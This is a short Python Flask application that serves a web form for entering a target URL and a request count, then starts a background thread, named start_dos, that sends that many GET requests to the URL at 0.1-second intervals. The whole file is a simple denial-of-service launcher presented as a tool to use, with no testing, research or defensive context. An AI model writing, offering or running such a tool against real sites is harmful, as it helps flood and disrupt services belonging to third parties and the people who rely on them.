from flask import Flask, render_template, request, redirect, url_for
import requests
import threading
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        num_requests = int(request.form['num_requests'])
        threading.Thread(target=start_dos, args=(url, num_requests)).start()
        return redirect(url_for('index'))
    return render_template('index.html')

def start_dos(url, num_requests):
    for _ in range(num_requests):
        try:
            requests.get(url)
        except Exception as e:
            print(f"Request failed: {e}")
        time.sleep(0.1)

@app.errorhandler(Exception)
def handle_error(e):
    return f"Internal Error: {str(e)}", 500
